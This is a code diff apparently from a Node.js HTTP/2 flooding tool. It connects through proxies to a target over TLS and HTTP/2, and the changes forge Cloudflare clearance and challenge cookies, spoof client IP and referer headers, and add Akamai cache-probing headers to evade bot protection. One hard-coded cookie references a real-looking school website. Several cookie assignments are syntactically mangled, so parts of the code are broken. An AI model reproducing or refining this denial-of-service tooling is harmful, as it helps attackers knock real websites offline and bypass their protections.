@@ -5880,21 +6583,21 @@ class NetSocket {
 
     return new Promise((resolve, reject) => {
       // Create connection to proxy server
-    const connection = net.connect({
+    const socket = net.connect({
          host: options.host,
          port: options.port
       });
 
       // Configure socket settings
-      connection.setTimeout(connectionTimeout * 1000); // Convert to milliseconds
-      connection.setKeepAlive(true, 100000); // 100 seconds keepalive
+      socket.setTimeout(connectionTimeout * 1000); // Convert to milliseconds
+      socket.setKeepAlive(true, 100000); // 100 seconds keepalive
 
       // Socket event handlers
-      connection.on("connect", () => {
-        connection.write(requestBuffer);
+      socket.on("connect", () => {
+        socket.write(requestBuffer);
       });
 
-      connection.on("data", (data) => {
+      socket.on("data", (data) => {
         const response = data.toString("utf-8");
         if (!response.includes("HTTP/1.1 200")) {
           socket.destroy();
@@ -5904,13 +6607,13 @@ class NetSocket {
         }
       });
 
-      connection.on("timeout", () => {
-        connection.destroy();
+      socket.on("timeout", () => {
+        socket.destroy();
         reject(new Error("error: timeout exceeded"));
       });
 
-      connection.on("error", (error) => {
-        connection.destroy();
+      socket.on("error", (error) => {
+        socket.destroy();
         reject(error);
       });
     })
@@ -5941,7 +6644,7 @@ headers.accept = accept;
 headers['sec-fetch-mode'] = "navigate";
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-user"] = '?1';     
-headers.cookie = ["cf_clearance=" + randstr(32) + '.' + randstr(10) + '-' + randstr(10) + '-1.0.1.1-' + randstr(11) + 'vs_V.' + randstr(21) + '' + randstr(47), "?__cf_chl_tk=" + randstr(43), "?__cf_chl_rt_tk=" + randayat(43) + '-' + randnombor(10) + "-0.0.1.1" + randnombor(4)];
+headers.cookie = "cf_clearance=" + randstr(32) + '.' + randstr(10) + '-' + randstr(10) + '-1.0.1.1-' + randstr(11) + 'vs_V.' + randstr(21) + '' + randstr(47), "?__cf_chl_tk=" + randstr(43), "?__cf_chl_rt_tk=" + randayat(43) + '-' + randnombor(10) + "-0.0.1.1" + randnombor(4);
 headers["set-cookie"] = CookieCf;
 headers["sec-fetch-site"] = "none";
 headers['x-requested-with'] = "XMLHttpRequest";
@@ -6105,8 +6808,10 @@ headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
  headers.pragma = 'no-cache';
  headers.pragma = "no-cache, akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace";
  headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194';
+ headers.cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194';
  headers.Cookie = "_ga_5BNN2065TL=GS2.1.s1748660772$o15$g1$t1748660964$j58$l0$h0; _ga=GA1.1.1589939676.1722590460; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-31%2001%3A58%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fdbtc-cebu.edu.ph%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-31%2001%3A58%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fdbtc-cebu.edu.ph%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%…tct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A139.0%29%20Gecko%2F20100101%20Firefox%2F139.0; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdbtc-cebu.edu.ph%2F"; 
- headers.cookie = ["cf_clearance=" + randstr(32) + '.' + randstr(10) + '-' + randstr(10) + '-1.0.1.1-' + randstr(11) + 'vs_V.' + randstr(21) + '' + randstr(47), "?__cf_chl_tk=" + randstr(43), "?__cf_chl_rt_tk=" + randayat(43) + '-' + randnombor(10) + "-0.0.1.1" + randnombor(4)];
+ headers.cookie = "cf_clearance=" + randstr(32) + '.' + randstr(10) + '-' + randstr(10) + '-1.0.1.1-' + randstr(11) + 'vs_V.' + randstr(21) + '' + randstr(47), "?__cf_chl_tk=" + randstr(43), "?__cf_chl_rt_tk=" + randayat(43) + '-' + randnombor(10) + "-0.0.1.1" + randnombor(4);
+ headers.cookie = "?__cf_chl_tk=" + randayat(2) + '.' + randnombor(10) + "-0.0.1.1" + randnombor(4);
  headers["Real-IP"] = spoofed2;
  headers["referer"] = randomReferer;
  headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
@@ -6250,12 +6955,12 @@ function runFlooder() {
   };
 
   // Establish HTTP connection through proxy
-  Socker.HTTP(proxyOptions, (connection, error) => {
+  Socker.HTTP(proxyOptions, (socket, error) => {
     if (error) {
       return; // Skip if connection failed
     }
 
-    connection.setKeepAlive(true, 100000); // 10 minutes keepalive
+    socket.setKeepAlive(true, 100000); // 10 minutes keepalive
 
     // TLS connection configuration
     const tlsOptions = {
@@ -6271,7 +6976,7 @@ function runFlooder() {
       cloudflareTimeout: 5000, // 5 seconds
       cloudflareMaxTimeout: 30000, // 30 seconds
       honorCipherOrder: true,
-      ALPNProtocols: ['h2', "http/1.1", 'spdy/3.1', 'http/1.2', "http/2", "http/2+quic/43", 'http/2+quic/44'],
+      ALPNProtocols: ['h2', "http/1.1", 'spdy/3.1', 'http/1.2', "http/2", "http/2+quic/43", 'http/2+quic/44', 'h3'],
       secureOptions: 
         crypto.constants.SSL_OP_NO_RENEGOTIATION |
         crypto.constants.SSL_OP_NO_TICKET |
@@ -6301,9 +7006,9 @@ function runFlooder() {
     };
 
     // Create TLS connection
-    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+    const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions); 
 
-    tlsConn.setKeepAlive(true, 10000); 
+    tlsSocket.setKeepAlive(true, 10000); 
 
     // Create HTTP/2 connection
     const http2Connection = http2.connect(parsedTarget.href, {
@@ -6317,8 +7022,8 @@ function runFlooder() {
       },
         maxSessionMemory: 64000,
         maxDeflateDynamicTableSize: 4294967295,
-        createConnection: () => tlsConn,
-        socket: connection,
+        createConnection: () => tlsSocket,
+        socket: socket,
     });
 
     // Update HTTP/2 settings
@@ -6335,12 +7040,12 @@ function runFlooder() {
     
     http2Connection.on("close", () => {
       http2Connection.destroy();
-      connection.destroy();
+      socket.destroy();
     });
     
     http2Connection.on("error", (err) => {
       http2Connection.destroy();
-      connection.destroy();
+      socket.destroy();
     });
   });
 }
